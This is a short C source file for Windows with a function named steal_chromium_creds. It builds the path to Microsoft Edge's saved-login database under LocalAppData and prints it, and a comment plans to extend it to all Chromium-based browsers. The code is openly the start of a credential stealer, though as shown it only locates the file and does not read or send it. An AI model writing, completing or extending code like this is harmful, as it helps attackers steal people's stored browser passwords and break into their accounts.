// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

int steal_chromium_creds() {
  PWSTR appDataPath = NULL;
  HRESULT hr;

  // Retrieve the path to the APPDATA directory
  hr = SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &appDataPath);
  if (SUCCEEDED(hr)) {
    // Should be a parameter later so that we can do all chromium based
    // browsers
    const wchar_t *additionalPath =
        L"\\Microsoft\\Edge\\User Data\\Default\\Login Data";

    // Calculate the total length needed for the full path
    size_t totalLength = wcslen(appDataPath) + wcslen(additionalPath) + 1;

    PWSTR fullPath = (PWSTR)malloc(totalLength * sizeof(wchar_t));
    if (fullPath) {
      // Concatenate the paths
      wcscpy(fullPath, appDataPath);
      wcscat(fullPath, additionalPath);

      wprintf(L"Full path: %ls\n", fullPath);
      free(fullPath);
    }

    // Free the memory allocated by SHGetKnownFolderPath
    CoTaskMemFree(appDataPath);
  } else {
    printf("Failed to retrieve APPDATA path. Error code: %08lX\n", hr);
  }

  return 0;
}
